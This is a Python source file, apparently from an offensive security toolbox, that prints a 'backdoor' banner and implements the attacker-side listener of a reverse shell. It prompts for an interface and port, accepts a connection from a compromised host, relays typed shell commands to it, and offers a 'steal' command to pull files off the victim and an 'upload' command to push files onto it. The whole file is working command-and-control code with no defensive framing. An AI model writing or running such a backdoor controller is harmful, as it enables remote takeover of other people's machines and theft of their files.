import sys
import os

from importmonkey import add_path

''' Export python module path '''

_i = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _i not in sys.path:
    add_path(_i)

import json
from toolbox.util.iputils import *

from toolbox.print.banner import *
from toolbox.print.clprinter import *

print_horizontal_delimiter()
print_backdoor_banner()
print_horizontal_delimiter()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
interfaces = get_interfaces_ipv4_dict()

def reliable_send(command, target):
    jsondata = json.dumps(command)
    target.send(jsondata.encode())

def reliable_receive(target):
    data = ""
    while(True):
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)
        except:
            continue

def handle_connection(s):
    print("# Listening for incoming connections...")
    target, ip = s.accept()
    print(f"[+] Started new communication with {ip}")
    communicate(target, ip)

def download(target, file_name):
    f = open(file_name, "wb")
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout:
            break
    target.settimeout(None)
    f.close()

def upload(target, file_name):
    f = open(file_name, "rb")
    target.send(f.read())
def communicate(target, ip):
    while(True):
        try:
            command = input("shell~%s" % str(ip))
            reliable_send(command, target)
            if command == "exit":
                quit()
            elif command[:3] == "cd ":
                pass
            elif command == "clear":
                os.system('cls||clear')
            elif command[:5] == "steal":
                download(target, command[6:])
            elif command[:6] == "upload":
                upload(target, command[7:])
            else:
                result = reliable_receive(target)
                print(result)
        except Exception as e:
            print(e)

interface = input("# Step 1: Specify network interface to use\n"
                     f"# all interfaces: {interfaces}\n"
                     "# ex. wlan0\n")
LHOST = interfaces.get(interface)
print(f"[i] LHOST is set to {LHOST}")
LPORT = input("# Step 2: Specify listener port\n"
                     "# ex. 4444\n")
print(f"[i] LPORT is set to {LPORT}")
s.bind((LHOST, int(LPORT)))
s.listen(1)
while(True):
    handle_connection(s)